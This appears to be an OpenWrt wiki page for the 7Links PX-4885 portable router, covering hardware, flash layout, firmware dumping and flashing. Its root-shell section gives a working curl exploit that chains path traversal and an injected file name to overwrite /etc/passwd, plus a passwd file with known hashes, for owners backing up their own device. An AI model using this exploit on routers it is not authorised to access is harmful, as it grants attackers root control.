@@ -1,0 +1,169 @@
+====== 7Links PX-4885 ======
+
+{{section>meta:infobox:432_warning#infobox_for_dataentries&noheader&nofooter&noeditbutton}}
+
+A small battery-powered wireless router.
+
+
+===== Supported Versions =====
+<!-- ToH: {
+  "source": "json",
+  "dom": "t",
+  "paging": false,
+  "rotate": true,
+  "shownColumns": ["brand", "model", "version", "supportedcurrentrel", "oemdevicehomepageurl", "owrt_forum_topic_url", "deviceid"],
+  "filterColumns": {"model": "^PX-4885$"}
+} -->
+
+
+===== Hardware Highlights =====
+<!-- ToH: {
+  "source": "json",
+  "dom": "t",
+  "paging": false,
+  "rotate": true,
+  "shownColumns": ["model", "version", "cpu", "cpumhz", "flashmb", "rammb", "wlanhardware", "wlan24ghz", "wlan50ghz", "ethernet100mports", "ethernet1gports", "modem", "usbports"],
+  "filterColumns": {"model": "^PX-4885$"}
+} -->
+
+
+===== Installation =====
+<!-- ToH: {
+  "source": "json",
+  "dom": "t",
+  "paging": false,
+  "rotate": true,
+  "shownColumns": ["model", "version", "supportedcurrentrel", "firmwareopenwrtinstallurl", "firmwareopenwrtupgradeurl", "firmwareoemstockurl"],
+  "filterColumns": {"model": "^PX-4885$"}
+} -->
+
+-> [[docs:guide-user:installation:generic.flashing|Install OpenWrt (generic explanation)]]
+
+
+==== Flash Layout ====
+^ Base address ^ Size ^ OpenWrt name ^ Purpose ^
+| 0x000000 | 0x020000 | u-boot | The bootloader. |
+| 0x020000 | 0x020000 | devdata | Stock firmware configuration. Unused in OpenWrt. |
+| 0x040000 | 0x010000 | devconf | Contains WiFi calibration and MAC addresses. |
+| 0x050000 | 0x3b0000 | firmware | The firmware itself. |
+
+==== Dumping the stock firmware ====
+In case you want to be able to switch back to the stock firmware, you need to dump it before installing OpenWrt as the manufacturer doesn't provide a firmware image.
+
+=== Obtaining a root shell ===
+The stock firmware has a telnet daemon running. However in order to drop to a root shell, it requires authenticating as user ''hongxun'' with a default password I couldn't figure out.
+
+Luckily, a flaw in the web UI allows us to overwrite the ''/etc/passwd'' file with one we provide and get a root shell.
+
+Here are the steps to follow:
+  - Reset the web UI username and password to admin/admin
+  - Prepare a FAT or NTFS formatted USB stick. Avoid using a multi-card reader for that since it may cause part of the firmware to crash.
+  - Create the files ''set_telnet_passwd.sh'' and ''passwd'' according to the two frames below. Save them in the same directory. Make sure ''set_telnet_password.sh'' has executable permission.
+  - Plug the USB stick into the router's USB port and wait 5 seconds after the blue LED blinks 5 times. This is necessary for a successful exploit of the flaw.
+  - Open a shell in the directory you just created the files and run the ''set_telnet_passwd.sh'' script. It should exit with a message like: ''curl: (52) Empty reply from server''.
+  - It it succeeded, you should be now able to telnet to the router and get a root shell using username ''admin'' and password ''admin''.
+
+== set_telnet_passwd.sh ==
+<code>
+#!/bin/sh
+
+ROUTER_IP=${1:-192.168.169.1}
+
+# Set the current directory.
+curl "http://admin:admin@${ROUTER_IP}/wireless/yun.asp?/media/../etc?946685196" > /dev/null
+
+# Remove the old passwd file.
+curl -d "n/a" "http://${ROUTER_IP}/goform/upload_file_set?action=del_files&filenames=passwd|"
+
+# And replace it with the patched one.
+curl -F "file=@passwd;filename=passwd" http://${ROUTER_IP}/cgi-bin/upload_file.cgi > /dev/null
+</code>
+
+
+== passwd ==
+
+<code>
+hongxun:ydh7SLkuJO1zE:0:0:Adminstrator:/:/bin/sh
+admin:8hES/Pe0q4.Q2:0:0:Adminstrator:/:/bin/sh
+</code>
+
+
+=== Performing the actual firmware dump ===
+Your USB media will likely be automounted as /media/sda1, so you should be able to dump a full flash image with the command:
+
+''cat /dev/mtd0ro > /media/sda1/px4885_stock_full_dump.img''
+
+The resulting file will contain a full image of the flash, with all the partitions.
+
+If you want a firmware image directly flashable with sysupgrade or TFTP, run the command:
+
+''cat /dev/mtd6ro > /media/sda1/px4885_stock_firmware.img''
+
+**IMPORTANT:** Before unplugging the USB stick or switching the router off, run the ''umount /media/sda1'' command to make sure all data was committed to disk.
+
+==== Flashing using the stock firmware web UI (easiest method) ====
+
+The web UI of the stock firmware can be used to flash an OpenWrt image. However it will only accept to flash an image using an initramfs root filesystem. So if you want to be able to keep your configuration across reboots, you'll need to flash your device twice:
+  * Flash an initramfs OpenWrt image using the web UI of the stock firmware.
+  * Now the device runs OpenWrt, perform a sysupgrade with a squashfs OpenWrt image. See [[docs:guide-user:installation:generic.sysupgrade]].
+
+==== Flashing using TFTP ====
+
+Another way to flash your device is to put the bootloader in TFTP flashing mode. To enter this mode, use a thin object (a needle for instance) to press the push button inside the small hole in the corner to the right of the ethernet port, and power on the device. If the bootloader successfully entered TFTP flashing mode, the led should be steady blue. As the button is not in the axis of the hole, it can prove difficult to hold it pressed while moving the power switch at the same time.
+
+In TFTP flashing mode, the bootloader will send TFTP requests on its ethernet interface. It will keep trying until succeeding at downloading the firmware image.
+
+**Note:** The bootloader will not check the validity of the downloaded firmware image. However, even in the case you fed it with an image that won't boot, you should still be able to restart the device in TFTP flashing mode as the bootloader partition is left untouched.
+
+Here are the information you need to know to setup a TFTP server and your network interface.
+| TFTP Server (your machine) IP address | 10.10.10.3 |
+| Firmware tftp image | Kernal.bin |
+| TFTP Client (device) IP Address | 10.10.10.123 |
+
+The ''Kernal.bin'' file fetched by the device from your TFTP server will be written directly into the ''firmware'' partition. It can be any valid Uboot image, and it obviously cannot be bigger than the size of the ''firmware'' partition (about 3.6 MiB).
+
+The flashing process may take a couple minutes.
+
+Once the bootloader has flashed the firmware, it will immediately attempt to boot it (the led will turn orange).
+
+==== Upgrading OpenWrt ====
+->  [[docs:guide-user:installation:generic.sysupgrade]]
+
+===== Basic configuration =====
+-> [[docs:guide-quick-start:checks_and_troubleshooting|Basic configuration]] After flashing, proceed with this.\\
+Set up your Internet connection, configure wireless, configure USB port, etc.
+
+==== Failsafe mode ====
+-> [[docs:guide-user:troubleshooting:failsafe_and_factory_reset]]
+
+===== Hardware =====
+
+==== Buttons ====
+-> [[docs:guide-user:hardware:hardware.button]] on howto use and configure the hardware button(s).
+
+The PX-4885 only has one software-accessible hardware button, which is the hidden reset button. The battery button used to check the battery level is not hooked to any GPIO so it cannot be repurposed in software.
+
+^ BUTTON ^ Event ^
+| Reset | reset | 
+
+==== Serial ====
+-> [[docs:techref:hardware:port.serial]] general information about the serial port, serial port cable, etc.
+
+This device seems to have UART pins accessible through test pads on the board. I didn't test that thought.
+
+==== JTAG ====
+-> [[docs:techref:hardware:port.jtag]] general information about the JTAG port, JTAG cable, etc.
+
+===== Debricking =====
+-> [[docs:guide-user:troubleshooting:generic.debrick]]
+
+If you didn't erase your bootloader partition, you should still be able to boot into TFTP flashing mode and flash a new firmware image using this.
+
+===== Notes =====
+
+  * The stock firmware claims to have only 16 MiB RAM while the RAM chip is actually a 32 MiB one. OpenWrt reports the RAM size correctly and can use the full 32 MiB of RAM. What a pleasant surprise!
+  * [[http://www.7links.me/3G-WLAN-Router-PX-4885-919.shtml#downloads|GPL source code (DE)]]\\ **NOTE:** The GPL tarball provided by the manufacturer contains the Ralink SDK but not all the required software and assets to build the stock firmware image.
+
+
+===== Tags =====
+{{tag>ramips rt5350 rechargeable_battery usb_powered portable_router 4Flash 32RAM USB 1USB USB2.0 Serial FastEthernet 1NIC no_switch 802.11b 802.11g 802.11n 802.11bgn}}
